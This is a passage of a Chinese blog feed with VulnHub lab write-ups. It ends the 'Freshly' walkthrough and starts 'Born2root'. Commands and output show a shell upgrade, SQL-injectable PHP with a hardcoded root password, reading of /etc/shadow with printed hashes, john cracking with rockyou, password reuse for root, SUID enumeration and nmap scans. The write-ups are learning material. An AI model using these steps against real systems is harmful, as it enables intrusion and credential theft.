inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:ad:0d:f7 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.136/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fead:df7/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">daemon@Freshly:/$ cd /var/www/html</span><br><span class="hljs-string">cd /var/www/html</span><br><span class="hljs-string">daemon@Freshly:/var/www/html$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for daemon: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for daemon: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for daemon: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br><span class="hljs-string">daemon@Freshly:/var/www/html$ ls -alih</span><br><span class="hljs-string">ls -alih</span><br><span class="hljs-string">total 1.0M</span><br><span class="hljs-string">266919 drwxr-xr-x 2 root root  4.0K Feb 17  2015 .</span><br><span class="hljs-string">266918 drwxr-xr-x 3 root root  4.0K Feb 16  2015 ..</span><br><span class="hljs-string">272717 -rw-r--r-- 1 root root    47 Feb 17  2015 index.html</span><br><span class="hljs-string">136671 -rw-r--r-- 1 root root   609 Feb 17  2015 login.php</span><br><span class="hljs-string">275638 -rw-r--r-- 1 root root 1008K Nov 12  2012 tumblr_mdeo27ZZjB1r6pf3eo1_500.gif</span><br><span class="hljs-string">daemon@Freshly:/var/www/html$ cat login.php</span><br><span class="hljs-string">cat login.php</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">mysql_connect(&#x27;</span>localhost<span class="hljs-string">&#x27;,&#x27;</span>root<span class="hljs-string">&#x27;,&#x27;</span>SuperSecretPassword<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">mysql_select_db(&#x27;</span>login<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-string">&lt;table width=&quot;50%&quot;&gt;</span><br><span class="hljs-string">        &lt;tr&gt;</span><br><span class="hljs-string">                &lt;td&gt;User&lt;/td&gt;</span><br><span class="hljs-string">                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;/td&gt;</span><br><span class="hljs-string">        &lt;/tr&gt;</span><br><span class="hljs-string">        &lt;tr&gt;</span><br><span class="hljs-string">                &lt;td&gt;Password&lt;/td&gt;</span><br><span class="hljs-string">                &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;</span><br><span class="hljs-string">        &lt;/tr&gt;</span><br><span class="hljs-string">        &lt;/table&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;s&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">if($_POST[&#x27;</span>s<span class="hljs-string">&#x27;])&#123;</span><br><span class="hljs-string">        $user = $_POST[&#x27;</span>user<span class="hljs-string">&#x27;];</span><br><span class="hljs-string">        $pass = $_POST[&#x27;</span>password<span class="hljs-string">&#x27;];</span><br><span class="hljs-string">        $re = mysql_query(&quot;select * from users where user_name = &#x27;</span><span class="hljs-variable">$user</span><span class="hljs-string">&#x27; and password = &#x27;</span><span class="hljs-variable">$pass</span><span class="hljs-string">&#x27;&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        if(mysql_num_rows($re) == 0)&#123;</span><br><span class="hljs-string">                echo &#x27;</span>0<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">        &#125;else&#123;</span><br><span class="hljs-string">                echo &#x27;</span>1<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>最最基础的信息收集，不过只发现了数据库密码和 wordpress 登录密码相同</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看看家目录判断有哪些用户，以及是否有敏感文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemon@Freshly:/var/www/html$ <span class="hljs-built_in">ls</span> -alih /home<br><span class="hljs-built_in">ls</span> -alih /home<br>total 12K<br>523266 drwxr-xr-x  3 root root 4.0K Feb 16  2015 .<br>     2 drwxr-xr-x 21 root root 4.0K Feb 16  2015 ..<br>523424 drwxr-xr-x  3 user user 4.0K Feb 17  2015 user<br>daemon@Freshly:/var/www/html$ <span class="hljs-built_in">cd</span> /home/user <br><span class="hljs-built_in">cd</span> /home/user<br>daemon@Freshly:/home/user$ <span class="hljs-built_in">ls</span> -laih<br><span class="hljs-built_in">ls</span> -laih<br>total 92M<br>523424 drwxr-xr-x 3 user user 4.0K Feb 17  2015 .<br>523266 drwxr-xr-x 3 root root 4.0K Feb 16  2015 ..<br>523349 -rw------- 1 user user 1.5K Feb 20  2015 .bash_history<br>523426 -rw-r--r-- 1 user user  220 Feb 16  2015 .bash_logout<br>523427 -rw-r--r-- 1 user user 3.6K Feb 16  2015 .bashrc<br>523324 drwx------ 2 user user 4.0K Feb 16  2015 .cache<br>523425 -rw-r--r-- 1 user user  675 Feb 16  2015 .profile<br>523327 -rw------- 1 root root 1.0K Feb 16  2015 .rnd<br>523326 -rwxr-xr-x 1 root root  92M Dec 18  2014 bitnami-wordpress-4.1-0-linux-installer.run<br></code></pre></td></tr></table></figure><p>user 用户家目录没有可读写文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemon@Freshly:/tmp$ <span class="hljs-built_in">ls</span> -alih /etc/passwd<br><span class="hljs-built_in">ls</span> -alih /etc/passwd<br>787781 -rw-r--r-- 1 root root 1.3K Feb 20  2015 /etc/passwd<br>daemon@Freshly:/tmp$ <span class="hljs-built_in">cat</span> /etc/passwd   <br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false<br>messagebus:x:102:105::/var/run/dbus:/bin/false<br>user:x:1000:1000:user,,,:/home/user:/bin/bash<br>mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false<br>candycane:x:1001:1001::/home/candycane:<br><span class="hljs-comment"># YOU STOLE MY SECRET FILE!</span><br><span class="hljs-comment"># SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span><br></code></pre></td></tr></table></figure><p>最后两行似乎是暗示，但是这个文件只是可读文件不可写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemon@Freshly:/tmp$ <span class="hljs-built_in">ls</span> -alih /etc/shadow<br><span class="hljs-built_in">ls</span> -alih /etc/shadow<br>786885 -rwxr-xr-x 1 root shadow 1.1K Feb 17  2015 /etc/shadow<br>daemon@Freshly:/tmp$ <span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">cat</span> /etc/shadow<br>root:$6<span class="hljs-variable">$If</span>.Y9A3d<span class="hljs-variable">$L1</span>/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::<br>daemon:*:16483:0:99999:7:::<br>bin:*:16483:0:99999:7:::<br>sys:*:16483:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:16483:0:99999:7:::<br>games:*:16483:0:99999:7:::<br>man:*:16483:0:99999:7:::<br>lp:*:16483:0:99999:7:::<br>mail:*:16483:0:99999:7:::<br>news:*:16483:0:99999:7:::<br>uucp:*:16483:0:99999:7:::<br>proxy:*:16483:0:99999:7:::<br>www-data:*:16483:0:99999:7:::<br>backup:*:16483:0:99999:7:::<br>list:*:16483:0:99999:7:::<br>irc:*:16483:0:99999:7:::<br>gnats:*:16483:0:99999:7:::<br>nobody:*:16483:0:99999:7:::<br>libuuid:!:16483:0:99999:7:::<br>syslog:*:16483:0:99999:7:::<br>messagebus:*:16483:0:99999:7:::<br>user:$6$MuqQZq4i<span class="hljs-variable">$t</span>/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::<br>mysql:!:16483:0:99999:7:::<br>candycane:$6$gfTgfe6A<span class="hljs-variable">$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa</span>/:16483:0:99999:7:::<br><span class="hljs-comment"># YOU STOLE MY PASSWORD FILE!</span><br><span class="hljs-comment"># SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span><br></code></pre></td></tr></table></figure><p>shadow 文件也可读，将其 copy 下来放到 john 中爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/freshly]<br>└─$ sudo john rootpasswd --wordlist=/usr/share/wordlists/rockyou.txt<br>Using default input encoding: UTF-8<br>Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br>Cost 1 (iteration count) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>password         (candycane)<br></code></pre></td></tr></table></figure><p>很快爆破出 candycane 的密码是 password，切换登录到 candycane</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemon@Freshly:/tmp$ su candycane<br>su candycane<br>Password: password<br><br>candycane@Freshly:/tmp$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(candycane) gid=1001(candycane) <span class="hljs-built_in">groups</span>=1001(candycane)<br></code></pre></td></tr></table></figure><p>查看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">candycane@Freshly:/tmp$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>查看 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">candycane@Freshly:/home$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>920060   12 -rwsr-xr-x   1 root     root         9612 Dec  4  2014 /usr/lib/pt_chown<br>920882    8 -rwsr-xr-x   1 root     root         5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>927842  484 -rwsr-xr-x   1 root     root       492972 May 12  2014 /usr/lib/openssh/ssh-keysign<br>917586  328 -rwsr-xr--   1 root     messagebus   333952 Nov 25  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>927745   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr<br>924487   20 -rwsr-xr-x   1 root     root        18136 May  7  2014 /usr/bin/traceroute6.iputils<br>917796   36 -rwsr-xr-x   1 root     root        35916 Feb 16  2014 /usr/bin/chsh<br>917792   48 -rwsr-xr-x   1 root     root        45420 Feb 16  2014 /usr/bin/passwd<br>917599   32 -rwsr-xr-x   1 root     root        30984 Feb 16  2014 /usr/bin/newgrp<br>917797   68 -rwsr-xr-x   1 root     root        66252 Feb 16  2014 /usr/bin/gpasswd<br>917790   44 -rwsr-xr-x   1 root     root        44620 Feb 16  2014 /usr/bin/chfn<br>921697  156 -rwsr-xr-x   1 root     root       156708 Feb 10  2014 /usr/bin/sudo<br>927978  316 -rwsr-xr--   1 root     dip        323000 Nov 25  2014 /usr/sbin/pppd<br>928195   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Nov  6  2014 /usr/sbin/uuidd<br>523310   40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping<br>523269   88 -rwsr-xr-x   1 root     root        88752 Nov  6  2014 /bin/mount<br>523356   32 -rwsr-xr-x   1 root     root        30112 Dec 16  2013 /bin/fusermount<br>523305   36 -rwsr-xr-x   1 root     root        35300 Feb 16  2014 /bin/su<br>523353   68 -rwsr-xr-x   1 root     root        67704 Nov  6  2014 /bin/umount<br>523309   44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6<br></code></pre></td></tr></table></figure><p>pt_chown 和 mtr 见的比较少，搜索了一下，不过没找到可用的提权方法</p><p>linpeas 辅助收集信息，也没发现什么有价值的东西（gcc 无了）</p><p>尝试密码碰撞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">candycane@Freshly:/tmp$ su<br>su<br>Password: SuperSecretPassword<br><br>root@Freshly:/tmp<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>碰撞出来了……有一丢丢无语</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Freshly:/tmp<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@Freshly:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>root@Freshly:~<span class="hljs-comment"># ls -alih</span><br><span class="hljs-built_in">ls</span> -alih<br>total 24K<br>130818 drwx------  3 root root 4.0K Feb 16  2015 .<br>     2 drwxr-xr-x 21 root root 4.0K Feb 16  2015 ..<br>134493 drwx------  2 root root 4.0K Feb 16  2015 .aptitude<br>136627 -rw-------  1 root root 2.5K Aug 26 08:36 .bash_history<br>130820 -rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc<br>130819 -rw-r--r--  1 root root  140 Feb 19  2014 .profile<br>root@Freshly:~<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@Freshly:~<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:ad:0d:f7 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.136/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fead:df7/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@Freshly:~<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux Freshly 3.13.0-45-generic <span class="hljs-comment">#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以前在网站的 SQL 注入漏洞利用过程中，只关注了当前数据库，而这次敏感信息（密码）并不在当前数据库。这台靶机对我来说的最大价值也是这方面，同时最后的密码碰撞也提醒了我，有的时候没有一个好的渗透和记录习惯，对于个人打靶的过程并不好。以后打算参考一些视频里的做法，在打靶的过程中对关键信息做简单的记录。</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Born2root 靶机</title>
    <link href="/2023/08/f7491954730f.html"/>
    <url>/2023/08/f7491954730f.html</url>
    
    <content type="html"><![CDATA[<h1 id="Born2root-靶机"><a href="#Born2root-靶机" class="headerlink" title="Born2root 靶机"></a>Born2root 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.135<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 11:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.135<br>Host is up (0.00091s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>46650/tcp open  unknown<br>MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.82 seconds<br></code></pre></td></tr></table></figure><p>开放了 22,80,111,56650 端口，接下来进行版本探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,111,46650 192.168.56.135     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 11:50 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.135<br>Host is up (0.00047s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)<br>|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)<br>|   256 d4:02:99:b0:e7:7d:40:18:64:<span class="hljs-built_in">df</span>:3b:28:5b:9e:f9:07 (ECDSA)<br>|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:<span class="hljs-built_in">cd</span>:<span class="hljs-built_in">df</span>:13:76:32:4e (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title:  Secretsec Company <br>| http-robots.txt: 2 disallowed entries <br>|_/wordpress-blog /files<br>|_http-server-header: Apache/2.4.10 (Debian)<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          46371/udp6  status<br>|   100024  1          46650/tcp   status<br>|   100024  1          48871/udp   status<br>|_  100024  1          49219/tcp6  status<br>46650/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.60 seconds<br></code></pre></td></tr></table></figure><p>有价值的信息不多，提取一下：Debian 操作系统，<code>OpenSSH 6.7</code>，<code>robots.txt</code>（含两个目录信息），<code>Apache httpd 2.4.10</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap --script=vuln -p22,80,111,46650 192.168.56.135 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 12:15 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.135<br>Host is up (0.00035s latency).<br><br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based 